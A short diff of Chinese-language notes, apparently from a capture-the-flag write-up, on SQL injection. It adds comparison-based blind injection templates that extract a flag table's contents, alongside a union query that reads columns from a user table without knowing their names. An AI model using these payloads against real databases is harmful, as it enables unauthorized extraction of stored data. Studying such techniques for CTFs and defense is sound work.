@@ -56,8 +56,13 @@ select group_concat(`2`) from  (select 1,2 union select * from user) as u
 
 表的字段数判断：select 1,2 union select * from user  试出字段数。
 
+一个字段一条记录
+select((select "{}")>(select * from f1ag_1s_h3r3_hhhhh))
+两个字段一条记录，获取字段
+select((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))
 
-
+select((select 1,"fla")>(select * from f1ag_1s_h3r3_hhhhh))
+一次比较1或0即可
 ```
 
 ^
